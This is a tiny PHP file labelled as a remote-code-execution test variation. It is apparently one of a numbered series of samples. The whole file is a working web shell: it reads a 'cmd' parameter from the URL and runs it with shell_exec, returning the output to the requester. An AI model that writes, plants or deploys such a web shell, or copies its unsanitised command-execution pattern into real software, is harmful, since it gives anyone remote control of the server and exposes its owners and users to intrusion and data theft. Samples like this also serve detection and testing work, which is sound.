<?php
// RCE test variation #1276
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>